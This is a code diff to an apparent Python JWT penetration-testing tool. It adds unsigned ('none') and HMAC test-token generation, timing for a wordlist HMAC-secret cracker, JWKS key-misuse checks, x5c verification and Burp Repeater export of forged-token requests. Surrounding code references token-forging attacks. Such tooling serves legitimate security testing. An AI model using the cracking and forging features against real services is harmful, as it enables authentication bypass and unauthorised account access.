@@ -18,6 +18,7 @@ import sys
 import time
 import urllib.request
 import urllib.error
+import urllib.parse
 import ssl
 import gzip
 import zlib
@@ -126,6 +127,22 @@ TRANSLATIONS = {
         "kid_injection": "'kid' contains dangerous characters: {kid}",
         "risk_score": "[*] Overall Risk Score: {score} ({level})",
         "json_output": "[*] JSON output written to {file}",
+        "generating": "[*] GENERATING TEST TOKEN",
+        "generated_token": "[+] Generated Token ({alg}):",
+        "generate_unsupported_alg": "--generate only supports alg 'none' or HMAC algs (HS256/HS384/HS512)",
+        "generate_secret_required": "-k/--secret required to generate an HMAC token",
+        "jwks_duplicate_kid": "[!] WARNING: duplicate 'kid' across keys: {kid} (key confusion risk)",
+        "jwks_missing_kid": "[?] Key {index} has no 'kid'",
+        "jwks_missing_use": "[?] Key {index} (kid={kid}) has no 'use' claim",
+        "jwks_sig_enc_conflict": "[!] WARNING: key {index} (kid={kid}) declares use='{use}' but alg='{alg}' looks like the opposite",
+        "crack_progress": "[*] Tried {count} words in {elapsed:.1f}s ({rate:.0f} words/sec)",
+        "crack_eta": "[*] Estimated wordlist size: {total} words (~{eta:.1f}s at current rate)",
+        "x5c_verifying": "[*] Verifying signature against leaf certificate in 'x5c'...",
+        "x5c_valid": "[+] Signature matches the certificate embedded in 'x5c' (the header is self-consistent, still do not trust it blindly)",
+        "x5c_invalid": "[!] Signature does NOT match the certificate embedded in 'x5c'",
+        "x5c_error": "[!] Could not verify against 'x5c': {error}",
+        "burp_exported": "[+] Raw HTTP request written to {file} (import into Burp Repeater)",
+        "burp_export_error": "[!] Could not write Burp request file: {error}",
     },
     "it": {
         "vuln_analysis": "[*] ANALISI VULNERABILITÀ",
@@ -214,6 +231,22 @@ TRANSLATIONS = {
         "kid_injection": "'kid' contiene caratteri pericolosi: {kid}",
         "risk_score": "[*] Punteggio di Rischio Complessivo: {score} ({level})",
         "json_output": "[*] Output JSON scritto in {file}",
+        "generating": "[*] GENERAZIONE TOKEN DI TEST",
+        "generated_token": "[+] Token generato ({alg}):",
+        "generate_unsupported_alg": "--generate supporta solo alg 'none' o HMAC (HS256/HS384/HS512)",
+        "generate_secret_required": "-k/--secret richiesto per generare un token HMAC",
+        "jwks_duplicate_kid": "[!] ATTENZIONE: 'kid' duplicato tra le chiavi: {kid} (rischio key confusion)",
+        "jwks_missing_kid": "[?] La chiave {index} non ha 'kid'",
+        "jwks_missing_use": "[?] La chiave {index} (kid={kid}) non ha il campo 'use'",
+        "jwks_sig_enc_conflict": "[!] ATTENZIONE: la chiave {index} (kid={kid}) dichiara use='{use}' ma alg='{alg}' sembra l'opposto",
+        "crack_progress": "[*] Provate {count} parole in {elapsed:.1f}s ({rate:.0f} parole/sec)",
+        "crack_eta": "[*] Dimensione stimata wordlist: {total} parole (~{eta:.1f}s al ritmo attuale)",
+        "x5c_verifying": "[*] Verifica della firma contro il certificato leaf in 'x5c'...",
+        "x5c_valid": "[+] La firma corrisponde al certificato incorporato in 'x5c' (l'header è coerente, non fidarti comunque ciecamente)",
+        "x5c_invalid": "[!] La firma NON corrisponde al certificato incorporato in 'x5c'",
+        "x5c_error": "[!] Impossibile verificare con 'x5c': {error}",
+        "burp_exported": "[+] Richiesta HTTP raw scritta in {file} (importala in Burp Repeater)",
+        "burp_export_error": "[!] Impossibile scrivere il file della richiesta Burp: {error}",
     },
     "es": {
         "vuln_analysis": "[*] ANÁLISIS DE VULNERABILIDADES",
@@ -581,6 +614,7 @@ def t(msg_key, **kwargs):
 try:
     from cryptography.hazmat.primitives import hashes, serialization
     from cryptography.hazmat.primitives.asymmetric import padding, rsa, ec, ed25519, ed448, utils
+    from cryptography import x509
     HAS_CRYPTO = True
 except ImportError:
     HAS_CRYPTO = False
@@ -786,12 +820,15 @@ def verify_hmac(info, secret):
 def verify_asymmetric(info, pub_key_bytes):
     if not HAS_CRYPTO:
         raise JwtError(t("crypto_missing"))
-    alg = info["header"].get("alg")
-    signing_input = f"{info['parts'][0]}.{info['parts'][1]}".encode()
     try:
         public_key = serialization.load_pem_public_key(pub_key_bytes)
     except Exception as e:
         raise JwtError(t("pubkey_load_error", error=e))
+    return verify_asymmetric_with_key(info, public_key)
+
+def verify_asymmetric_with_key(info, public_key):
+    alg = info["header"].get("alg")
+    signing_input = f"{info['parts'][0]}.{info['parts'][1]}".encode()
     try:
         if alg.startswith("RS"):
             hash_alg = hashes.SHA256() if alg == "RS256" else hashes.SHA384() if alg == "RS384" else hashes.SHA512()
@@ -816,6 +853,34 @@ def verify_asymmetric(info, pub_key_bytes):
         return True
     except Exception:
         return False
+
+# --------------------------------------------------------- TOKEN GENERATOR --
+def generate_token(alg, claims_to_set, secret=None, exp_seconds=None):
+    """Build a fresh JWT from scratch for lab/testing use (alg 'none' or HMAC)."""
+    header = {"alg": alg, "typ": "JWT"}
+    payload = {}
+    now_ts = int(time.time())
+    payload["iat"] = now_ts
+    if exp_seconds is not None:
+        payload["exp"] = now_ts + exp_seconds
+    for assignment in claims_to_set:
+        k, v_str = assignment.split("=", 1)
+        try:
+            v = json.loads(v_str)
+        except json.JSONDecodeError:
+            v = v_str
+        payload[k] = v
+    header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')))
+    payload_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')))
+    signing_input = f"{header_b64}.{payload_b64}".encode()
+    if alg.lower() == "none":
+        return f"{header_b64}.{payload_b64}.", header, payload
+    if alg.upper() not in HMAC_ALGS:
+        raise JwtError(t("generate_unsupported_alg"))
+    if not secret:
+        raise JwtError(t("generate_secret_required"))
+    sig = hmac.new(secret.encode(), signing_input, HMAC_ALGS[alg.upper()]).digest()
+    return f"{header_b64}.{payload_b64}.{b64url_encode(sig)}", header, payload
 
 # --------------------------------------------------------- ATTACK ENGINE --
 def forge_none(info):
@@ -866,6 +931,7 @@ def forge_claims(info, claims_to_set, secret, jku=None, x5u=None):
 
 # --------------------------------------------------------- CRACK ENGINE --
 def crack_hmac(token, wordlist_path, max_lines=None):
+    """Returns (found_word_or_None, attempts, elapsed_seconds, estimated_total_words)."""
     info = parse_token(token)
     if info["type"] != "JWS":
         raise JwtError(t("jwe_crack"))
@@ -874,21 +940,33 @@ def crack_hmac(token, wordlist_path, max_lines=None):
         raise JwtError(t("not_hmac", alg=alg))
     signing_input = f"{info['parts'][0]}.{info['parts'][1]}".encode()
     target_sig = info["signature"]
+    start = time.time()
+    attempts = 0
+    estimated_total = None
+    try:
+        file_size = os.path.getsize(wordlist_path)
+    except OSError:
+        file_size = None
     try:
         with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
             for i, line in enumerate(f):
                 if max_lines and i >= max_lines:
                     break
                 word = line.rstrip("\n\r")
+                if estimated_total is None and file_size and i == 999 and f.tell() > 0:
+                    avg_bytes = f.tell() / (i + 1)
+                    if avg_bytes > 0:
+                        estimated_total = int(file_size / avg_bytes)
                 if not word:
                     continue
+                attempts += 1
                 secret = word.encode()
                 expected = hmac.new(secret, signing_input, HMAC_ALGS[alg]).digest()
                 if hmac.compare_digest(expected, target_sig):
-                    return word
+                    return word, attempts, time.time() - start, estimated_total
     except OSError as e:
         raise JwtError(t("wordlist_error", error=e))
-    return None
+    return None, attempts, time.time() - start, estimated_total
 
 # --------------------------------------------------------- VULN SCANNER --
 def analyze(info, now):
@@ -981,6 +1059,24 @@ def analyze(info, now):
     return findings
 
 # --------------------------------------------------------- HTTP ENGINE --
+def export_burp_request(filepath, url, method, headers_str, new_token):
+    """Write a raw HTTP request file suitable for pasting into Burp Repeater."""
+    parsed = urllib.parse.urlsplit(url)
+    path = parsed.path or "/"
+    if parsed.query:
+        path += f"?{parsed.query}"
+    lines = [f"{method.upper()} {path} HTTP/1.1", f"Host: {parsed.netloc}"]
+    if headers_str:
+        for h in headers_str.split(","):
+            k, v = h.split(":", 1)
+            lines.append(f"{k.strip()}: {v.strip()}")
+    lines.append(f"Authorization: Bearer {new_token}")
+    lines.append("Connection: close")
+    lines.append("")
+    lines.append("")
+    with open(filepath, "w") as f:
+        f.write("\r\n".join(lines))
+
 def test_http_endpoint(url, method, headers_str, new_token, original_token=None, insecure=False,
                        success_strings=None, failure_strings=None):
     if not HAS_REQUESTS:
@@ -1021,6 +1117,21 @@ def test_http_endpoint(url, method, headers_str, new_token, original_token=None,
     except Exception as e:
         print(f"  {RED}{t('http_error', error=e)}{RESET}")
 
+# --------------------------------------------------------- X5C CHAIN VERIFIER --
+def verify_x5c_leaf(info):
+    """Verify the signature against the leaf certificate embedded in the header's 'x5c'.
+    This only proves the header is self-consistent: an attacker who controls the
+    header can embed their own certificate, so this is NOT proof of trust."""
+    if not HAS_CRYPTO:
+        raise JwtError(t("crypto_missing"))
+    x5c = info["header"].get("x5c")
+    if not x5c:
+        return None
+    leaf_der = base64.b64decode(x5c[0])
+    cert = x509.load_der_x509_certificate(leaf_der)
+    public_key = cert.public_key()
+    return verify_asymmetric_with_key(info, public_key)
+
 # --------------------------------------------------------- JWKS ANALYZER --
 def analyze_jwks(url, insecure=False):
     ctx = ssl.create_default_context()
@@ -1034,10 +1145,30 @@ def analyze_jwks(url, insecure=False):
             jwks = json.loads(response.read().decode())
         keys = jwks.get("keys", [])
         print(f"{WHITE}{t('jwks_found', count=len(keys))}{RESET}")
+        seen_kids = {}
+        enc_algs = ("RSA-OAEP", "RSA-OAEP-256", "RSA1_5", "A128KW", "A192KW", "A256KW", "ECDH-ES")
+        sig_algs = ("RS", "PS", "ES", "HS", "EdDSA")
         for i, k in enumerate(keys):
-            print(f"  {RED}Key {i+1}:{RESET} kty={k.get('kty')}, kid={k.get('kid')}, alg={k.get('alg')}")
+            kid = k.get('kid')
+            alg = k.get('alg')
+            use = k.get('use')
+            print(f"  {RED}Key {i+1}:{RESET} kty={k.get('kty')}, kid={kid}, alg={alg}, use={use}")
             if k.get('d'):
                 print(f"    {RED}{t('jwks_private_key')}{RESET}")
+            if kid is None:
+                print(f"    {YELLOW}{t('jwks_missing_kid', index=i+1)}{RESET}")
+            else:
+                seen_kids.setdefault(kid, []).append(i + 1)
+            if use is None:
+                print(f"    {DIM}{t('jwks_missing_use', index=i+1, kid=kid)}{RESET}")
+            elif alg:
+                is_enc_alg = str(alg).upper() in enc_algs or str(alg).upper().startswith("RSA-OAEP")
+                is_sig_alg = str(alg).upper().startswith(sig_algs)
+                if (use == "sig" and is_enc_alg) or (use == "enc" and is_sig_alg):
+                    print(f"    {RED}{t('jwks_sig_enc_conflict', index=i+1, kid=kid, use=use, alg=alg)}{RESET}")
+        for kid, indexes in seen_kids.items():
+            if len(indexes) > 1:
+                print(f"  {RED}{t('jwks_duplicate_kid', kid=kid)}{RESET} (keys {indexes})")
     except Exception as e:
         print(f"{RED}{t('jwks_error', error=e)}{RESET}")
 
@@ -1066,6 +1197,9 @@ def main():
     parser.add_argument("--crack", metavar="WORDLIST", help="Crack HMAC secret")
     parser.add_argument("--max-lines", type=int, help="Limit wordlist lines")
     parser.add_argument("--attack", choices=["none", "confusion", "kid", "forge"], help="Run an attack")
+    parser.add_argument("--generate", metavar="ALG", help="Generate a fresh test token (alg 'none' or HS256/HS384/HS512)")
+    parser.add_argument("--exp", type=int, metavar="SECONDS", help="With --generate: expiry in seconds from now")
+    parser.add_argument("--export-burp", metavar="FILE", help="With --url/--attack: write a raw HTTP request file for Burp Repeater")
     parser.add_argument("--set", action="append", default=[], help="Claim=value (JSON supported)")
     parser.add_argument("-k", "--secret", help="Secret for HMAC")
     parser.add_argument("-K", "--pubkey", help="Public key file for asymmetric ops")
@@ -1097,18 +1231,32 @@ def main():
     if args.no_color or not sys.stdout.isatty():
         RED = DRED = WHITE = BLACK = GREEN = YELLOW = DIM = RESET = BOLD = ""
     
-    if not args.token and not args.file and not args.jwks:
+    if not args.token and not args.file and not args.jwks and not args.generate:
         print(logo)
         parser.print_help()
         sys.exit(2)
-    
+
     if sys.stdout.isatty():
         print(logo)
-    
+
+    if args.generate:
+        print(f"{DRED}{t('generating')}{RESET}")
+        try:
+            new_token, header, payload = generate_token(args.generate, args.set, args.secret, args.exp)
+        except JwtError as e:
+            print(f"{RED}{t('error', error=e)}{RESET}")
+            sys.exit(1)
+        print(f"{RED}{BOLD}{t('header')}{RESET}")
+        print(json.dumps(header, indent=2))
+        print(f"{RED}{BOLD}{t('payload')}{RESET}")
+        print(json.dumps(payload, indent=2))
+        print(f"{GREEN}{t('generated_token', alg=args.generate)}{RESET}\n{new_token}")
+        sys.exit(0)
+
     if args.jwks:
         analyze_jwks(args.jwks, insecure=args.insecure)
         sys.exit(0)
-    
+
     try:
         raw = open(args.file).read() if args.file else args.token
         token = extract_token(raw)
@@ -1167,6 +1315,14 @@ def main():
                 level = "LOW"
             print(f"\n{DRED}{t('risk_score', score=total, level=level)}{RESET}")
         
+        if "x5c" in info["header"] and HAS_CRYPTO:
+            print(f"\n{DIM}{t('x5c_verifying')}{RESET}")
+            try:
+                ok = verify_x5c_leaf(info)
+                print(f"  {GREEN if ok else RED}{t('x5c_valid') if ok else t('x5c_invalid')}{RESET}")
+            except Exception as e:
+                print(f"  {RED}{t('x5c_error', error=e)}{RESET}")
+
         if args.json:
             out = {
                 "header": info["header"],
@@ -1179,12 +1335,18 @@ def main():
         print(f"\n{DRED}=================================================={RESET}")
         print(f"{RED}{BOLD}{t('cracking')}{RESET}")
         try:
-            secret = crack_hmac(token, args.crack, args.max_lines)
+            secret, attempts, elapsed, estimated_total = crack_hmac(token, args.crack, args.max_lines)
+            rate = attempts / elapsed if elapsed > 0 else attempts
+            if estimated_total:
+                eta = estimated_total / rate if rate > 0 else 0
+                print(f"{DIM}{t('crack_eta', total=estimated_total, eta=eta)}{RESET}")
             if secret:
                 print(f"{GREEN}{t('secret_found', secret=secret)}{RESET}")
+                print(f"{DIM}{t('crack_progress', count=attempts, elapsed=elapsed, rate=rate)}{RESET}")
                 sys.exit(4)
             else:
                 print(f"{YELLOW}{t('secret_not_found')}{RESET}")
+                print(f"{DIM}{t('crack_progress', count=attempts, elapsed=elapsed, rate=rate)}{RESET}")
         except Exception as e:
             print(f"{RED}{t('error', error=e)}{RESET}")
             sys.exit(1)
@@ -1217,7 +1379,14 @@ def main():
             if args.poc and args.url:
                 print(f"\n{YELLOW}{t('poc_generated')}{RESET}")
                 print(t("poc_curl", method=args.method, url=args.url, token=new_token))
-            
+
+            if args.export_burp and args.url:
+                try:
+                    export_burp_request(args.export_burp, args.url, args.method, args.headers, new_token)
+                    print(f"{GREEN}{t('burp_exported', file=args.export_burp)}{RESET}")
+                except Exception as e:
+                    print(f"{RED}{t('burp_export_error', error=e)}{RESET}")
+
             if args.verify_endpoint:
                 test_http_endpoint(
                     args.verify_endpoint, args.method, args.headers,
